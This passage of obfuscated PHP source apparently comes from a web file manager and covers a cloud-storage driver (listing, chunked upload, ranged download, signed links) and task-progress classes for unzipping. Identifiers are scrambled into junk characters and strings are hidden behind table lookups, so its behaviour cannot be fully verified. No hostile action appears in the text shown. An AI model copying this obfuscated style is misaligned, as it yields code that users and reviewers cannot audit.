!0; if (empty($‚² §â³)) { $‚² §â³ = $this->objectMeta($šşªù¸õ); if (!$‚² §â³) { return $«å–öñş; } } $«å–öñş[$Š«Ÿé[243]] = intval($‚² §â³[$Š«Ÿé[1573]]); $«å–öñş[$Š«Ÿé[88]] = intval($‚² §â³[$Š«Ÿé[1574]]); return $«å–öñş; } private function listObjs($÷ş“‘”æ, $ƒ›¾Åñ› = 0, $á„€Ë©ƒ = 1000) { $†àğËÕÙ =& $_SERVER[±³—úê]; $¬ à”…„ = array($†àğËÕÙ[1575], $†àğËÕÙ[1576] . $á„€Ë©ƒ); if ($ƒ›¾Åñ›) { $¬ à”…„[] = $†àğËÕÙ[1577] . $ƒ›¾Åñ›; } $™ªŒù = $this->ussRequest($÷ş“‘”æ, $†àğËÕÙ[1499], !1, $¬ à”…„); return !$™ªŒù[$†àğËÕÙ[1299]] ? !1 : $™ªŒù[$†àğËÕÙ[1289]]; } private function fileList($ıñÌ…Ä™, &$÷÷¬…–‹, &$«ö¤ÊåĞ, $†ÊÖò¢ñ = false) { $Ñğøá¸¹ =& $_SERVER[±³—úê]; $Ã›ôû…ˆ = $Ñğøá¸¹[12]; $•£Äˆ›ı = 1000; $½İ¤Á = rtrim($ıñÌ…Ä™, $Ñğøá¸¹[8]) . $Ñğøá¸¹[8]; while (!0) { check_abort(); $¹›êûÄ = $this->listObjs($ıñÌ…Ä™, $Ã›ôû…ˆ, $•£Äˆ›ı); if (!$¹›êûÄ) { return !1; } $Ã›ôû…ˆ = isset($¹›êûÄ[$Ñğøá¸¹[1578]]) ? $¹›êûÄ[$Ñğøá¸¹[1578]] : $Ñğøá¸¹[12]; $˜×Ş¬ëù = isset($¹›êûÄ[$Ñğøá¸¹[1579]]) ? $¹›êûÄ[$Ñğøá¸¹[1579]] : array(); foreach ($˜×Ş¬ëù as $à¬ä‡Óü) { $³öãá… = $à¬ä‡Óü[$Ñğøá¸¹[33]] == $Ñğøá¸¹[78] ? !0 : !1; $÷ÈÒ­û˜ = ltrim($½İ¤Á . $à¬ä‡Óü[$Ñğøá¸¹[32]], $Ñğøá¸¹[8]) . ($³öãá… ? $Ñğøá¸¹[8] : $Ñğøá¸¹[12]); $µÛã™ã = array($Ñğøá¸¹[32] => $÷ÈÒ­û˜, $Ñğøá¸¹[33] => $³öãá… ? $Ñğøá¸¹[78] : $Ñğøá¸¹[242], $Ñğøá¸¹[79] => $à¬ä‡Óü[$Ñğøá¸¹[423]], $Ñğøá¸¹[1574] => $à¬ä‡Óü[$Ñğøá¸¹[1580]]); $this->cacheMethodInfoSet($÷ÈÒ­û˜, $³öãá…, $µÛã™ã); if ($³öãá…) { $÷÷¬…–‹[] = $÷ÈÒ­û˜; if ($†ÊÖò¢ñ) { $this->fileList($÷ÈÒ­û˜, $÷÷¬…–‹, $«ö¤ÊåĞ, $†ÊÖò¢ñ); } continue; } $«ö¤ÊåĞ[] = $µÛã™ã; } if (count($˜×Ş¬ëù) < $•£Äˆ›ı) { break; } } $this->cacheMethodInfoSet($ıñÌ…Ä™, !0); } public function listPath($˜“ôÏ§–, $­Û±‘­› = false) { $ÔÇç¸€— =& $_SERVER[±³—úê]; $÷úº€ÏŸ = $—µûÚÄ = array(); $this->fileList($˜“ôÏ§–, $÷úº€ÏŸ, $—µûÚÄ); foreach ($÷úº€ÏŸ as $¼Ş àê => $Ùõ¢±†Ã) { $÷úº€ÏŸ[$¼Ş àê] = $this->folderInfo($Ùõ¢±†Ã, $­Û±‘­›); } foreach ($—µûÚÄ as $¼Ş àê => $Ùõ¢±†Ã) { $—µûÚÄ[$¼Ş àê] = $this->fileInfo($Ùõ¢±†Ã[$ÔÇç¸€—[32]], $­Û±‘­›, $Ùõ¢±†Ã); } return array($ÔÇç¸€—[85] => $÷úº€ÏŸ, $ÔÇç¸€—[86] => $—µûÚÄ); } public function has($ÀÀÖ™ñ“, $ƒŠÅîŸŞ = false, $şÅ¾šãü = true) { $Ö»ë±°ü =& $_SERVER[±³—úê]; $¯ÕàÒ„Ì = $Ö»ë±°ü[12]; $Œ´ª®Ï = 500; $Óå÷©í¸ = 0; $šœëçÂ× = 0; $â—†É¬ = rtrim($ÀÀÖ™ñ“, $Ö»ë±°ü[8]) . $Ö»ë±°ü[8]; while (!0) { check_abort(); $˜ï¥Æı÷ = $this->listObjs($ÀÀÖ™ñ“, $¯ÕàÒ„Ì, $Œ´ª®Ï); if (!$˜ï¥Æı÷) { return !1; } $¯ÕàÒ„Ì = isset($˜ï¥Æı÷[$Ö»ë±°ü[1578]]) ? $˜ï¥Æı÷[$Ö»ë±°ü[1578]] : $Ö»ë±°ü[12]; $îÚÑÆ²ø = isset($˜ï¥Æı÷[$Ö»ë±°ü[1579]]) ? $˜ï¥Æı÷[$Ö»ë±°ü[1579]] : array(); if (empty($îÚÑÆ²ø)) { break; } $µÍ—òè© = array_filter($îÚÑÆ²ø, function ($³æ¿¸ ö) { $÷€¡»»¤ =& $_SERVER[±³—úê]; return $³æ¿¸ ö[$÷€¡»»¤[33]] == $÷€¡»»¤[78]; }); $£¸“ãÙ­ = count($îÚÑÆ²ø); $µÍ—òè© = count($µÍ—òè©); $ƒºúéÇ¼ = $£¸“ãÙ­ - $µÍ—òè©; if ($ƒŠÅîŸŞ) { $šœëçÂ× += $µÍ—òè©; $Óå÷©í¸ += $ƒºúéÇ¼; if ($£¸“ãÙ­ < $Œ´ª®Ï) { break; } continue; } if ($şÅ¾šãü) { if ($ƒºúéÇ¼) { return !0; } } else { if ($µÍ—òè©) { return !0; } } if ($£¸“ãÙ­ < $Œ´ª®Ï) { break; } } if ($ƒŠÅîŸŞ) { return array($Ö»ë±°ü[251] => $Óå÷©í¸, $Ö»ë±°ü[252] => $šœëçÂ×); } return !1; } public function listAll($·ÃùÉ) { $§ûÈŠ£´ =& $_SERVER[±³—úê]; $ĞŠ ¡·Ù = $äôéÓõü = array(); $this->fileList($·ÃùÉ, $ĞŠ ¡·Ù, $äôéÓõü, !0); $ÒÎÕÃ¨Í = array_to_keyvalue($äôéÓõü, $§ûÈŠ£´[32]); foreach ($ĞŠ ¡·Ù as $ƒ‚ˆç‚„) { if (is_string($ƒ‚ˆç‚„)) { $ÒÎÕÃ¨Í[$ƒ‚ˆç‚„] = array($§ûÈŠ£´[79] => 0); } } return $this->listAllFiles($·ÃùÉ, $ÒÎÕÃ¨Í); } public function canRead($ú˜£ÂÚ) { return $this->exist($ú˜£ÂÚ) ? !0 : !1; } public function canWrite($’Œñ¸öŒ) { return $this->exist($’Œñ¸öŒ) ? !0 : !1; } public function getContent($¤ÏÀÉŠ¾) { return $this->fileSubstr($¤ÏÀÉŠ¾, 0, -1); } public function setContent($ÖËö®§Ê, $ú–µı™ = '') { $°”ÆòÀ¸ =& $_SERVER[±³—úê]; if (!$ú–µı™) { $®æè³İë = $this->ussRequest($ÖËö®§Ê, $°”ÆòÀ¸[299]); return $®æè³İë[$°”ÆòÀ¸[1299]]; } $‰šÌ“íÃ = $this->tempFile($this->pathThis($ÖËö®§Ê)); file_put_contents($‰šÌ“íÃ, $ú–µı™); if ($this->upload($ÖËö®§Ê, $‰šÌ“íÃ)) { $this->tempFileRemve($‰šÌ“íÃ); return !0; } return !1; } public function fileSubstr($‡¬§õ”ß, $¯Àê Šà, $óéãë¥™) { $ÑäÀØ¼ì =& $_SERVER[±³—úê]; if (!($¾âë‰Æõ = $this->link($‡¬§õ”ß))) { return !1; } $öú·ÔÛè = !1; if ($óéãë¥™ > 0) { $ï¬¯‹ŸÕ = $¯Àê Šà + $óéãë¥™ - 1; $öú·ÔÛè = array($ÑäÀØ¼ì[1539] . $¯Àê Šà . $ÑäÀØ¼ì[473] . $ï¬¯‹ŸÕ); } $ğ«Ê¥‹¡ = url_request($¾âë‰Æõ, $ÑäÀØ¼ì[1499], !1, $öú·ÔÛè); return $ğ«Ê¥‹¡[$ÑäÀØ¼ì[830]] ? $ğ«Ê¥‹¡[$ÑäÀØ¼ì[1289]] : !1; } public function upload($àêÄÕş, $‰öóš´†, $û¥‰üÜ = false, $ßÈ§˜´” = REPEAT_REPLACE) { $Õ«‹ŞÇ• =& $_SERVER[±³—úê]; $—²˜³›° = IO::size($‰öóš´†); if ($—²˜³›° <= 1024 * 1024 * 200) { $ñ” ©ª = array($Õ«‹ŞÇ•[1581] . $‰öóš´†); $ÉÅë¶¢ = $this->ussRequest($àêÄÕş, $Õ«‹ŞÇ•[265], $ñ” ©ª); return $ÉÅë¶¢[$Õ«‹ŞÇ•[1299]] ? $this->getPathOuter($àêÄÕş) : !1; } $Ú¡Äí = 1024 * 1024 * 10; $¤¸ê•ó³ = array($Õ«‹ŞÇ•[1582], $Õ«‹ŞÇ•[1583] . $—²˜³›°, $Õ«‹ŞÇ•[1584], $Õ«‹ŞÇ•[1585] . $Ú¡Äí); $ÉÅë¶¢ = $this->ussRequest($àêÄÕş, $Õ«‹ŞÇ•[265], !1, $¤¸ê•ó³); if (!$ÉÅë¶¢[$Õ«‹ŞÇ•[1299]]) { return !1; } $©‡®”Ÿû = $ÉÅë¶¢[$Õ«‹ŞÇ•[1289]]; $¸İ¯Ñ = 0; $È¼ò«çº = $©‡®”Ÿû[$Õ«‹ŞÇ•[1586]]; $‹€È¤‹– = fopen($‰öóš´†, $Õ«‹ŞÇ•[1461]); if (!$‹€È¤‹–) { return !1; } do { $÷Îüø¨’ = $©‡®”Ÿû[$Õ«‹ŞÇ•[1587]]; fseek_64($‹€È¤‹–, $¸İ¯Ñ); $¨ï‹ˆû¢ = fread($‹€È¤‹–, $÷Îüø¨’); $Î…°Á‰“ = 0; do { $Î…°Á‰“++; $©‡®”Ÿû = $this->uploadPart($àêÄÕş, $©‡®”Ÿû, $¨ï‹ˆû¢); } while (!$©‡®”Ÿû && $Î…°Á‰“ < 3); if (!$©‡®”Ÿû) { return !1; } $È¼ò«çº = $©‡®”Ÿû[$Õ«‹ŞÇ•[1586]]; $¸İ¯Ñ += $÷Îüø¨’; } while ($È¼ò«çº != -1); fclose($‹€È¤‹–); $¤¸ê•ó³ = array($Õ«‹ŞÇ•[1588], $Õ«‹ŞÇ•[1589] . $©‡®”Ÿû[$Õ«‹ŞÇ•[1590]], $Õ«‹ŞÇ•[1584]); $ÉÅë¶¢ = $this->ussRequest($àêÄÕş, $Õ«‹ŞÇ•[265], !1, $¤¸ê•ó³); return $ÉÅë¶¢[$Õ«‹ŞÇ•[1299]] ? $this->getPathOuter($ù—Öøà¯) : !1; } private function uploadPart($ºêã‰‰ú, $¿ÇÚ–¦÷, &$âÈ‚ş¹) { $èæ‘è• =& $_SERVER[±³—úê]; $û£¶ŞõÍ = array($èæ‘è•[1591], $èæ‘è•[1589] . $¿ÇÚ–¦÷[$èæ‘è•[1590]], $èæ‘è•[1592] . $¿ÇÚ–¦÷[$èæ‘è•[1586]], $èæ‘è•[146] . $¿ÇÚ–¦÷[$èæ‘è•[1587]]); $â—´‹¿¥ = $this->ussRequest($ºêã‰‰ú, $èæ‘è•[265], $âÈ‚ş¹, $û£¶ŞõÍ); return !$â—´‹¿¥[$èæ‘è•[1299]] ? $â—´‹¿¥[$èæ‘è•[1299]] : $â—´‹¿¥[$èæ‘è•[1289]]; } public function uploadFormData($ĞÕŞÔâ, $£Òà—åü = 3600) { return $this->uploadPolicy($ĞÕŞÔâ, $£Òà—åü); } public function uploadMultiData($´Áğ‹Ó, $ÔÏá§ûß = 3600) { $¹Åé¨ŞÍ =& $_SERVER[±³—úê]; $í¤•è¿› = (int) $GLOBALS[$¹Åé¨ŞÍ[7]][$¹Åé¨ŞÍ[79]]; return $this->uploadPolicy($´Áğ‹Ó, $ÔÏá§ûß, $í¤•è¿›); } private function uploadPolicy($ôÀ·Ş, $Æì½É = 3600, $¨Í¤æˆø = 0) { $ÕÛ ™úö =& $_SERVER[±³—úê]; $÷‹å‘Ò¹ = $ÕÛ ™úö[8] . $this->bucket; $ÓÃ®ƒË§ = gmdate($ÕÛ ™úö[1497]); $òÄÀãÆ = array($ÕÛ ™úö[1593] => $this->bucket, $ÕÛ ™úö[1594] => $ôÀ·Ş, $ÕÛ ™úö[1595] => time() + $Æì½É, $ÕÛ ™úö[1596] => $ÓÃ®ƒË§); if ($¨Í¤æˆø) { $òÄÀãÆ[$ÕÛ ™úö[1482]] = $¨Í¤æˆø; } $é¸Ëëò = base64_encode(json_encode($òÄÀãÆ)); $õ·öæö = base64_encode(hash_hmac($ÕÛ ™úö[1550], "\120\117\123\124\x26{$÷‹å‘Ò¹}\x26{$ÓÃ®ƒË§}\46{$é¸Ëëò}", md5("{$this->userpass}"), !0)); $ïŠ‡¦öÓ = array($ÕÛ ™úö[289] => $é¸Ëëò, $ÕÛ ™úö[1597] => "\x55\120\131\125\116\x20{$this->username}\x3a{$õ·öæö}", $ÕÛ ™úö[208] => $this->endpoint . $÷‹å‘Ò¹); return $ïŠ‡¦öÓ; } public function download($ëÜ¯¸²±, $§Û™ƒ·Ç) { $ö¹ÄÈ®î = IO::getPathInner(IO::mkfile($§Û™ƒ·Ç)); if (!($é“™ùú = $this->link($ëÜ¯¸²±))) { return !1; } $çµúËì¿ = 0; $ÂšÎĞ€· = 1024 * 200; $’–¸„¤ƒ = fopen($ö¹ÄÈ®î, $_SERVER[±³—úê][1545]); while (!0) { $¨øü¼­ = $this->fileSubstr($ëÜ¯¸²±, $çµúËì¿, $ÂšÎĞ€·); if ($¨øü¼­ === !1) { return !1; } fwrite($’–¸„¤ƒ, $¨øü¼­); $çµúËì¿ += $ÂšÎĞ€·; if (strlen($¨øü¼­) < $ÂšÎĞ€·) { break; } } fclose($’–¸„¤ƒ); return $§Û™ƒ·Ç; } public function link($˜¾Æáı¯, $ßÑÁ¯¡ö = array()) { $¬¨œ¨™• =& $_SERVER[±³—úê]; $˜¾Æáı¯ = trim($˜¾Æáı¯, $¬¨œ¨™•[8]); if (!empty($this->token)) { $€šø¡¹  = strtotime(date($¬¨œ¨™•[1598])); $õıÆ±² = substr(md5($this->token . $¬¨œ¨™•[296] . $€šø¡¹  . $¬¨œ¨™•[1599] . $˜¾Æáı¯), 12, 8) . $€šø¡¹ ; $ßÑÁ¯¡ö[] = $¬¨œ¨™•[1600] . $õıÆ±²; } $óŸÅÌºÈ = !empty($ßÑÁ¯¡ö) ? $¬¨œ¨™•[76] . implode($¬¨œ¨™•[296], $ßÑÁ¯¡ö) : $¬¨œ¨™•[12]; return $this->getHost() . $¬¨œ¨™•[8] . $this->pathEncode($˜¾Æáı¯) . $óŸÅÌºÈ; } public function fileOut($‘èá½‡•, $àÂ ¯øµ = false, $Êåû•Õ… = false, $Â²ºŸ½® = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($‘èá½‡•, $àÂ ¯øµ, $Êåû•Õ…, $Â²ºŸ½®); } if (!$Êåû•Õ…) { $Êåû•Õ… = $this->pathThis($‘èá½‡•); } $›Ù¿•”û = $àÂ ¯øµ ? array($_SERVER[±³—úê][1601] . rawurlencode($Êåû•Õ…)) : array(); $éù•½Š‹ = $this->link($‘èá½‡•, $›Ù¿•”û); $this->fileOutLink($éù•½Š‹); } public function fileOutServer($úş×ı©, $èæ¾Ì’û = false, $–¢¨öœ„ = false, $„ğƒˆ–œ = '') { parent::fileOut($úş×ı©, $èæ¾Ì’û, $–¢¨öœ„, $„ğƒˆ–œ); } public function fileOutImage($÷ø×¤¾î, $Ÿ¹¬¼¯¨ = 250) { $–í²†Ï« = $this->link($÷ø×¤¾î . $_SERVER[±³—úê][1602] . $Ÿ¹¬¼¯¨); $this->fileOutLink($–í²†Ï«); } public function fileOutImageServer($ˆŠãª—¿, $áœ³·ü‹ = 250) { parent::fileOutImage($ˆŠãª—¿, $áœ³·ü‹); } public function hashMd5($â«­ÄÂº) { $’¤Œ¶…‘ =& $_SERVER[±³—úê]; $¶÷„Ÿ²÷ = $this->_objectMeta($â«­ÄÂº); return isset($¶÷„Ÿ²÷[$’¤Œ¶…‘[257]]) ? $¶÷„Ÿ²÷[$’¤Œ¶…‘[257]] : !1; } public function size($™¬ƒ‘©ğ) { $î’Ò«ƒ = $this->objectMeta($™¬ƒ‘©ğ); return $î’Ò«ƒ ? $î’Ò«ƒ[$_SERVER[±³—úê][79]] : 0; } public function info($˜†Õ…Ó÷) { if ($this->isFolder($˜†Õ…Ó÷)) { return $this->folderInfo($˜†Õ…Ó÷); } else { if ($this->isFile($˜†Õ…Ó÷)) { return $this->fileInfo($˜†Õ…Ó÷); } } return !1; } public function exist($ó‡Ñê”¯) { return $this->isFile($ó‡Ñê”¯) || $this->isFolder($ó‡Ñê”¯); } public function isFile($ôÛ•ñşÀ) { return !$this->isFolder($ôÛ•ñşÀ) && $this->objectMeta($ôÛ•ñşÀ); } public function isFolder($êëö’Ù) { return $this->cacheMethod($_SERVER[±³—úê][179], $êëö’Ù); } protected function objectMeta($„›Û¥) { return $this->cacheMethod($_SERVER[±³—úê][181], $„›Û¥); } protected function _objectMeta($’¼ñÂ¨Ò) { $¾…šÔ‚ =& $_SERVER[±³—úê]; if ($’¼ñÂ¨Ò == $¾…šÔ‚[12] || $’¼ñÂ¨Ò == $¾…šÔ‚[8]) { return array(); } $ˆÌ¨˜Öñ = $this->ussRequest($’¼ñÂ¨Ò, $¾…šÔ‚[1603]); if (!$ˆÌ¨˜Öñ[$¾…šÔ‚[1299]]) { return null; } $ÎÈĞùı = isset($ˆÌ¨˜Öñ[$¾…šÔ‚[1289]]) ? $ˆÌ¨˜Öñ[$¾…šÔ‚[1289]] : array(); if (!isset($ÎÈĞùı[$¾…šÔ‚[1604]])) { return null; } $€­¬…ÅØ = array($¾…šÔ‚[33] => isset($ÎÈĞùı[$¾…šÔ‚[1604]]) ? $ÎÈĞùı[$¾…šÔ‚[1604]] : null, $¾…šÔ‚[79] => isset($ÎÈĞùı[$¾…šÔ‚[1605]]) ? $ÎÈĞùı[$¾…šÔ‚[1605]] : null, $¾…šÔ‚[257] => isset($ÎÈĞùı[$¾…šÔ‚[1606]]) ? $ÎÈĞùı[$¾…šÔ‚[1606]] : null, $¾…šÔ‚[1573] => isset($ÎÈĞùı[$¾…šÔ‚[1607]]) ? $ÎÈĞùı[$¾…šÔ‚[1607]] : null); $€­¬…ÅØ[$¾…šÔ‚[1574]] = isset($ÎÈĞùı[$¾…šÔ‚[1608]]) ? strtotime($ÎÈĞùı[$¾…šÔ‚[1608]]) : $€­¬…ÅØ[$¾…šÔ‚[1573]]; return $€­¬…ÅØ; } protected function _isFolder($¡’§‘Á¥) { $†¯‰ğ·Ÿ =& $_SERVER[±³—úê]; if ($¡’§‘Á¥ == $†¯‰ğ·Ÿ[12] || $¡’§‘Á¥ == $†¯‰ğ·Ÿ[8]) { return !0; } $€´“ÛÀ = $this->_objectMeta($¡’§‘Á¥); return isset($€´“ÛÀ[$†¯‰ğ·Ÿ[33]]) && $€´“ÛÀ[$†¯‰ğ·Ÿ[33]] == $†¯‰ğ·Ÿ[78] ? !0 : !1; } } goto E‚¾ñ°“ØÓ; F¸‚êãÖ´ˆ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Éğëçœê, $¹ç«áâã = 5.0) { if (!$Éğëçœê) { return; } $´ÎÆö€µ = Cache::get($Éğëçœê); if (!$´ÎÆö€µ || timeFloat() - floatVal($´ÎÆö€µ) >= $¹ç«áâã) { Cache::set($Éğëçœê, timeFloat(), $¹ç«áâã * 10); return !0; } return !1; } public static function timeLimitCall($³šü™…ˆ, $ÅûøĞçÍ, $ï–êõ›Ø, $ş’¬ì¥± = 5.0) { $Ñ¬²¢’É =& $_SERVER[±³—úê]; if (!$³šü™…ˆ || !$ÅûøĞçÍ) { return; } self::$asyncAdd = !0; $üÓİ¢â = $Ñ¬²¢’É[1882]; $óîü³é = Cache::get($üÓİ¢â, !0); $€Ø€»şÔ = array($Ñ¬²¢’É[1883] => timeFloat(), $Ñ¬²¢’É[1884] => timeFloat(), $Ñ¬²¢’É[352] => $ÅûøĞçÍ, $Ñ¬²¢’É[1874] => $ï–êõ›Ø, $Ñ¬²¢’É[206] => $ş’¬ì¥±); if (is_array($óîü³é[$³šü™…ˆ])) { $€Ø€»şÔ[$Ñ¬²¢’É[1884]] = $óîü³é[$³šü™…ˆ][$Ñ¬²¢’É[1884]]; } if (is_array($óîü³é[$³šü™…ˆ])) { if (timeFloat() - $óîü³é[$³šü™…ˆ][$Ñ¬²¢’É[1883]] < $€Ø€»şÔ[$Ñ¬²¢’É[206]] * 0.3) { return; } $€Ø€»şÔ[$Ñ¬²¢’É[1884]] = $óîü³é[$³šü™…ˆ][$Ñ¬²¢’É[1884]]; } $óîü³é[$³šü™…ˆ] = $€Ø€»şÔ; Cache::set($üÓİ¢â, $óîü³é, 60); Cache::removeMemory($üÓİ¢â); write_log($Ñ¬²¢’É[1885] . $³šü™…ˆ . $Ñ¬²¢’É[74] . $ÅûøĞçÍ, $Ñ¬²¢’É[197]); } public static function timeLimitCallLoop() { $ìôÜ“¢„ =& $_SERVER[±³—úê]; $Û³ëÍáÄ = array($ìôÜ“¢„[1886]); $º¦†ú…ˆ = in_array(strtolower(ACTION), $Û³ëÍáÄ); if (!$º¦†ú…ˆ && !self::$asyncAdd) { return; } $‘¥¥¤¿É = $ìôÜ“¢„[1882]; $ğ‰°•¦ = Cache::get($‘¥¥¤¿É, !0); if (!$ğ‰°•¦ || count($ğ‰°•¦) <= 0) { return; } $Éùêê™û = !1; $ô’ØŒÙÙ = timeFloat(); $ÁÎÊ‚¦Æ = array(); foreach ($ğ‰°•¦ as $Äº¤’Íª => $ÏÀ³„£×) { if ($ô’ØŒÙÙ - $ÏÀ³„£×[$ìôÜ“¢„[1884]] > $ÏÀ³„£×[$ìôÜ“¢„[206]]) { $Éùêê™û = !0; try { Hook::apply($ÏÀ³„£×[$ìôÜ“¢„[352]], $ÏÀ³„£×[$ìôÜ“¢„[1874]]); write_log($ìôÜ“¢„[1887] . $Äº¤’Íª . $ìôÜ“¢„[74] . $ÏÀ³„£×[$ìôÜ“¢„[352]] . $ìôÜ“¢„[1888] . ACTION, $ìôÜ“¢„[197]); } catch (Exception $·«¿Ü´») { } continue; } $ÁÎÊ‚¦Æ[$Äº¤’Íª] = $ÏÀ³„£×; } if (!$Éùêê™û) { return; } if (!$ÁÎÊ‚¦Æ) { return Cache::remove($‘¥¥¤¿É); } Cache::set($‘¥¥¤¿É, $ÁÎÊ‚¦Æ, 60); Cache::removeMemory($‘¥¥¤¿É); } public static function finished($ØÂôÀ°, $¡ğäïê) { $Á–™ø‡† =& $_SERVER[±³—úê]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Á–™ø‡†[352] => $ØÂôÀ°, $Á–™ø‡†[1874] => $¡ğäïê); } private static function finishedRun() { $×£Ñ³ =& $_SERVER[±³—úê]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $»óí•Î×) { try { Hook::apply($»óí•Î×[$×£Ñ³[352]], $»óí•Î×[$×£Ñ³[1874]]); } catch (Exception $£÷¹Óí) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $£Š»ı¥š =& $_SERVER[±³—úê]; parent::startAfter(); Hook::bind($£Š»ı¥š[1889], array($this, $£Š»ı¥š[1890])); Hook::bind($£Š»ı¥š[1280], array($this, $£Š»ı¥š[1891])); Hook::bind($£Š»ı¥š[1892], array($this, $£Š»ı¥š[1893])); $—¨æ±ëî =& $this->task; $—¨æ±ëî[$£Š»ı¥š[1894]] = $£Š»ı¥š[1281]; if (!$—¨æ±ëî[$£Š»ı¥š[1661]]) { $—¨æ±ëî[$£Š»ı¥š[1661]] = LNG($£Š»ı¥š[1895]); } } protected function endAfter() { $¤×­€ö‚ =& $_SERVER[±³—úê]; parent::endAfter(); Hook::unbind($¤×­€ö‚[1889], array($this, $¤×­€ö‚[1890])); Hook::unbind($¤×­€ö‚[1280], array($this, $¤×­€ö‚[1891])); Hook::unbind($¤×­€ö‚[1892], array($this, $¤×­€ö‚[1893])); } public function updateAfter() { $„“§Æ·º =& $_SERVER[±³—úê]; $…¦­€Øµ =& $this->task; if (!$…¦­€Øµ[$„“§Æ·º[1142]] || !$…¦­€Øµ[$„“§Æ·º[843]]) { if ($…¦­€Øµ[$„“§Æ·º[1894]] != $„“§Æ·º[399]) { return; } } if ($…¦­€Øµ[$„“§Æ·º[1894]] == $„“§Æ·º[1281]) { $‚èú³àÇ = 0; if ($…¦­€Øµ[$„“§Æ·º[1829]]) { $‚èú³àÇ = $…¦­€Øµ[$„“§Æ·º[1830]] / $…¦­€Øµ[$„“§Æ·º[1829]]; } $…¦­€Øµ[$„“§Æ·º[1777]] = $‚èú³àÇ * 0.3; } else { if ($…¦­€Øµ[$„“§Æ·º[1894]] == $„“§Æ·º[399]) { $‚èú³àÇ = $…¦­€Øµ[$„“§Æ·º[1776]] / $…¦­€Øµ[$„“§Æ·º[1142]]; $…¦­€Øµ[$„“§Æ·º[1777]] = 0.3 + $‚èú³àÇ * 0.4; } else { if ($…¦­€Øµ[$„“§Æ·º[1894]] == $„“§Æ·º[110]) { $€ÎÇÙı = 0; if ($…¦­€Øµ[$„“§Æ·º[1831]] == $„“§Æ·º[110]) { $€ÎÇÙı = $…¦­€Øµ[$„“§Æ·º[1830]]; } $‚èú³àÇ = ($…¦­€Øµ[$„“§Æ·º[1834]] + $€ÎÇÙı) / $…¦­€Øµ[$„“§Æ·º[843]]; $…¦­€Øµ[$„“§Æ·º[1777]] = 0.3 + 0.4 + $‚èú³àÇ * 0.3; } } } if ($…¦­€Øµ[$„“§Æ·º[1777]] > 0) { $Å£œã‹š = timeFloat() - $…¦­€Øµ[$„“§Æ·º[1779]] - $…¦­€Øµ[$„“§Æ·º[1782]]; $…¦­€Øµ[$„“§Æ·º[1783]] = $Å£œã‹š * (1 - $…¦­€Øµ[$„“§Æ·º[1777]]) / $…¦­€Øµ[$„“§Æ·º[1777]]; } } public function addFile($Êñå·Œ) { $àóÉÔŸ =& $_SERVER[±³—úê]; $á”¬åÒ =& $this->task; $Ü™½œ ë = IO::info($Êñå·Œ); $á”¬åÒ[$àóÉÔŸ[1827]] = $Ü™½œ ë[$àóÉÔŸ[32]]; $á”¬åÒ[$àóÉÔŸ[1829]] = $Ü™½œ ë[$àóÉÔŸ[79]]; $á”¬åÒ[$àóÉÔŸ[1830]] = 0; $á”¬åÒ[$àóÉÔŸ[1144]] = $àóÉÔŸ[1850]; $á”¬åÒ[$àóÉÔŸ[1831]] = $àóÉÔŸ[1281]; $á”¬åÒ[$àóÉÔŸ[843]] = $Ü™½œ ë[$àóÉÔŸ[79]]; $á”¬åÒ[$àóÉÔŸ[1142]] = 1; $¸×¢îô = 0; $á”¬åÒ[$àóÉÔŸ[1838]] = array($àóÉÔŸ[1839] => $¸×¢îô + 1, $àóÉÔŸ[505] => $Ü™½œ ë[$àóÉÔŸ[32]], $àóÉÔŸ[87] => $Ü™½œ ë[$àóÉÔŸ[87]], $àóÉÔŸ[593] => $Ü™½œ ë[$àóÉÔŸ[593]] ? $Ü™½œ ë[$àóÉÔŸ[593]] : $Ü™½œ ë[$àóÉÔŸ[87]]); $this->update(); } public function zipEvent($ÌÓêÅı», $Üù¡ñÏŠ, $ËÀ–—Òö, $éİîíç) { $–ü½“ª =& $_SERVER[±³—úê]; $âğ§õ—‰ =& $this->task; $âğ§õ—‰[$–ü½“ª[1827]] = get_path_this($Üù¡ñÏŠ); $âğ§õ—‰[$–ü½“ª[1829]] = $éİîíç; $âğ§õ—‰[$–ü½“ª[1830]] = $ËÀ–—Òö; $âğ§õ—‰[$–ü½“ª[1144]] = $ÌÓêÅı» == $–ü½“ª[1896] ? $–ü½“ª[1897] : $–ü½“ª[1898]; $âğ§õ—‰[$–ü½“ª[1831]] = $–ü½“ª[12]; $âğ§õ—‰[$–ü½“ª[843]] = $éİîíç; $âğ§õ—‰[$–ü½“ª[1894]] = $–ü½“ª[399]; $this->update(); } public function unzipAfter($ÍûñÌÍ) { $ëÇ×³ıâ =& $_SERVER[±³—úê]; $¬¢©Ê¸î =& $this->task; $¬¢©Ê¸î[$ëÇ×³ıâ[1894]] = $ëÇ×³ıâ[110]; $Á¥ãˆÛİ = IO::infoWithChildren($ÍûñÌÍ); $÷‡èøí« = 0; $¬¢©Ê¸î[$ëÇ×³ıâ[1838]] = array($ëÇ×³ıâ[1839] => $÷‡èøí« + 1, $ëÇ×³ıâ[505] => $Á¥ãˆÛİ[$ëÇ×³ıâ[32]], $ëÇ×³ıâ[87] => $Á¥ãˆÛİ[$ëÇ×³ıâ[87]], $ëÇ×³ıâ[593] => $Á¥ãˆÛİ[$ëÇ×³ıâ[593]] ? $Á¥ãˆÛİ[$ëÇ×³ıâ[593]] : $Á¥ãˆÛİ[$ëÇ×³ıâ[87]]); if ($Á¥ãˆÛİ[$ëÇ×³ıâ[33]] == $ëÇ×³ıâ[242]) { $¬¢©Ê¸î[$ëÇ×³ıâ[1142]] = 1; } else { $¬¢©Ê¸î[$ëÇ×³ıâ[1142]] = $Á¥ãˆÛİ[$ëÇ×³ıâ[82]][$ëÇ×³ıâ[80]]; } $¬¢©Ê¸î[$ëÇ×³ıâ[1144]] = $ëÇ×³ıâ[12]; $¬¢©Ê¸î[$ëÇ×³ıâ[1831]] = 0; $¬¢©Ê¸î[$ëÇ×³ıâ[1776]] = 0; $¬¢©Ê¸î[$ëÇ×³ıâ[1829]] = 0; $¬¢©Ê¸î[$ëÇ×³ıâ[1830]] = 0; $¬¢©Ê¸î[$ëÇ×³ıâ[1827]] = $ëÇ×³ıâ[12]; $¬¢©Ê¸î[$ëÇ×³ıâ[1834]] = 0; $¬¢©Ê¸î[$ëÇ×³ıâ[843]] = 